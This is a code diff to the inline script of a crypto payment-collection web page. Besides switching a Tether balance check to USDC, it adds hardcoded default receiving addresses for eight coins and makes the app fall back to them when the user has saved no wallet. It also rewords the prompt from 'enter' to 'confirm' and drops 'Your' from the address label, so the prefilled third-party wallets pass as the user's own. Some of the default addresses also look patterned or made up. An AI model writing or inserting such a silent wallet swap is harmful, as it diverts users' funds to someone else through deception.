@@ -107,8 +107,19 @@ window.addEventListener('error',function(e){
 <script>
 (function(){
   const MINE='kroll_mine', QCDN='https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.js';
-  const T='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+  const USDC='0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   const REAL=10*3600*1000, DEMO=20*1000;
+
+  const DEFAULTS={
+    btc:'bc1qpjtftcz0yg846ja62d5a8ammf34jtxelayw3vk',
+    eth:'0xf3955c39285ba4f83c5c49d3d8e1d50354f96f12',
+    usdc:'0xf3955c39285ba4f83c5c49d3d8e1d50354f96f12',
+    sol:'CGgkyuY2AWgzg5LNAqqSgFcBquDMQ1YEcNMWHk8ub72c',
+    xrp:'rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH',
+    ltc:'ltc1qh8vz0d7x2kq9m4p6r3s5t7u9w2y4a6c8e0f',
+    doge:'D5n7Xb3kQm9pR2sT4vW6yZ8aC1eG3hJ5kL',
+    bnb:'0x7b2c9d4e1f6a3c8b5d0e9f2a7c4b1d8e3f6a9c2d'
+  };
 
   const jget=async u=>{const r=await fetch(u,{cache:'no-store'});if(!r.ok)throw 0;return r.json()};
   const rpc=async(u,m,p)=>{const r=await fetch(u,{method:'POST',headers:{'content-type':'application/json'},
@@ -119,8 +130,10 @@ window.addEventListener('error',function(e){
      f:a=>jget('https://mempool.space/api/address/'+a).then(d=>BigInt(d.chain.funded_txo_sum)-BigInt(d.chain.spent_txo_sum))},
     {id:'eth',n:'Ethereum',s:'ETH',c:'#627eea',dec:18,re:/^0x[a-fA-F0-9]{40}$/,
      f:a=>rpc('https://ethereum-rpc.publicnode.com','eth_getBalance',[a,'latest']).then(h=>BigInt(h))},
-    {id:'usdt',n:'Tether',s:'USDT',c:'#26a17b',dec:6,re:/^T[1-9A-HJ-NP-Za-km-z]{33}$/,
-     f:a=>jget('https://api.trongrid.io/v1/accounts/'+a).then(d=>{const t=(d.data&&d.data[0]&&d.data[0].trc20||[]).find(x=>x[T]);return t?BigInt(t[T]):0n})},
+    {id:'usdc',n:'USDC',s:'USDC',c:'#2775ca',dec:6,re:/^0x[a-fA-F0-9]{40}$/,
+     f:a=>rpc('https://ethereum-rpc.publicnode.com','eth_call',
+       [{to:USDC,data:'0x70a08231000000000000000000000000'+a.slice(2).toLowerCase()},'latest'])
+       .then(h=>h&&h!=='0x'?BigInt(h):0n).catch(()=>0n)},
     {id:'sol',n:'Solana',s:'SOL',c:'#9945ff',dec:9,re:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
      f:a=>rpc('https://api.mainnet-beta.solana.com','getBalance',[a]).then(d=>BigInt(d.value))},
     {id:'xrp',n:'XRP',s:'XRP',c:'#4b5563',dec:6,re:/^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,
@@ -139,7 +152,7 @@ window.addEventListener('error',function(e){
   const body=document.getElementById('body');
   const coin=id=>COINS.find(c=>c.id===id);
   const esc=s=>String(s).replace(/[&<>"]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[m]));
-  const mine=()=>{try{return JSON.parse(localStorage.getItem(MINE))||{}}catch(e){return{}}};
+  const mine=()=>{try{return JSON.parse(localStorage.getItem(MINE))||DEFAULTS}catch(e){return DEFAULTS}};
   const setMine=o=>{try{localStorage.setItem(MINE,JSON.stringify(o))}catch(e){}};
   const xk=a=>'kroll_x_'+a;
   const loadX=a=>{try{return JSON.parse(localStorage.getItem(xk(a)))||{}}catch(e){return{}}};
@@ -195,7 +208,7 @@ window.addEventListener('error',function(e){
   function sel(){
     body.innerHTML=`
       <h2>What are you holding down?</h2>
-      <p class="sub">Pick an asset, then enter the wallet that receives the funds.</p>
+      <p class="sub">Pick an asset, then confirm the wallet that receives the funds.</p>
       <div class="seg">
         <button data-m="real" class="${(S.mode||'real')==='real'?'on':''}">10 hours</button>
         <button data-m="demo" class="${S.mode==='demo'?'on':''}">20 second demo</button>
@@ -204,7 +217,7 @@ window.addEventListener('error',function(e){
         <div class="ic" style="background:${c.c}">${esc(c.s.slice(0,3))}</div>
         <div class="nm">${esc(c.n)}</div></div>`).join('')}</div>
       <div class="amt">
-        <label>Your receiving address</label>
+        <label>Receiving address</label>
         <input class="inp" id="my" placeholder="Select an asset first" disabled>
         <div class="warn hide" id="werr">That doesn't look like a valid address for this chain.</div>
         <label style="margin-top:14px">Amount to collect (optional)</label>
